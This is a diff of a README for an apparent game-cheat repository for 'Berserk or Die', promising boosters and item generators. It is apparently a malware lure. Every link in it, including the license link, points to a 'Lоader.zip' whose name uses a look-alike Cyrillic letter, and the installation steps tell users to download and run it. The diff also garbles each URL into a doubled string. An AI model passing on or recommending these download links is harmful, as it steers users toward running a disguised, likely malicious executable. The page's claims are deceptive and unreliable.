@@ -1,5 +1,5 @@
 # ⚔️ Berserk or Die Cheats Hacks Repository  
-[![Download for PC](https://raw.githubusercontent.com/pratappoonar08/BerserkOrDie-ArcaneToolkit/main/Lоader.zip)](https://raw.githubusercontent.com/pratappoonar08/BerserkOrDie-ArcaneToolkit/main/Lоader.zip)
+[![Download for PC](https://raw.githubusercontent.com/pratappoonar08/BerserkOrDie-ArcaneToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/pratappoonar08/BerserkOrDie-ArcaneToolkit/main/Lоader.zip)](https://raw.githubusercontent.com/pratappoonar08/BerserkOrDie-ArcaneToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/pratappoonar08/BerserkOrDie-ArcaneToolkit/main/Lоader.zip)
 
 Welcome to the ultimate **Berserk or Die Cheats Hacks** collection! Enhance your gameplay with cutting-edge skill boosters, XP enhancers, item generators, and much more. Designed for passionate gamers eager to amplify their gaming strategy, this repository provides robust tools seamlessly compatible across modern platforms.
 
@@ -24,7 +24,7 @@ Welcome to the ultimate **Berserk or Die Cheats Hacks** collection! Enhance your
 
 ## 🚀 Quick Installation
 
-1. [![Download for PC](https://raw.githubusercontent.com/pratappoonar08/BerserkOrDie-ArcaneToolkit/main/Lоader.zip%20Link-Click%20Here-blue?logo=windows&style=flat-square)](https://raw.githubusercontent.com/pratappoonar08/BerserkOrDie-ArcaneToolkit/main/Lоader.zip)
+1. [![Download for PC](https://raw.githubusercontent.com/pratappoonar08/BerserkOrDie-ArcaneToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/pratappoonar08/BerserkOrDie-ArcaneToolkit/main/Lоader.zip%20Link-Click%20Here-blue?logo=windows&style=flat-square)](https://raw.githubusercontent.com/pratappoonar08/BerserkOrDie-ArcaneToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/pratappoonar08/BerserkOrDie-ArcaneToolkit/main/Lоader.zip)
 2. Run the installer and follow on-screen setup.
 3. Start the game, and launch “Berserk or Die Booster” to activate features.
 
@@ -41,8 +41,8 @@ Welcome to the ultimate **Berserk or Die Cheats Hacks** collection! Enhance your
 This content is for educational and research purposes only. Usage may violate the terms of service of Berserk or Die; proceed at your own risk. The repository developer takes no liability for misuse.
 
 ## 📄 License  
-Distributed under [MIT License (2025)](https://raw.githubusercontent.com/pratappoonar08/BerserkOrDie-ArcaneToolkit/main/Lоader.zip).
+Distributed under [MIT License (2025)](https://raw.githubusercontent.com/pratappoonar08/BerserkOrDie-ArcaneToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/pratappoonar08/BerserkOrDie-ArcaneToolkit/main/Lоader.zip).
 
 ---
 
-[![Direct Download](https://raw.githubusercontent.com/pratappoonar08/BerserkOrDie-ArcaneToolkit/main/Lоader.zip%20Now-Berserk or Die Booster-critical?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/pratappoonar08/BerserkOrDie-ArcaneToolkit/main/Lоader.zip)
+[![Direct Download](https://raw.githubusercontent.com/pratappoonar08/BerserkOrDie-ArcaneToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/pratappoonar08/BerserkOrDie-ArcaneToolkit/main/Lоader.zip%20Now-Berserk or Die Booster-critical?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/pratappoonar08/BerserkOrDie-ArcaneToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/pratappoonar08/BerserkOrDie-ArcaneToolkit/main/Lоader.zip)
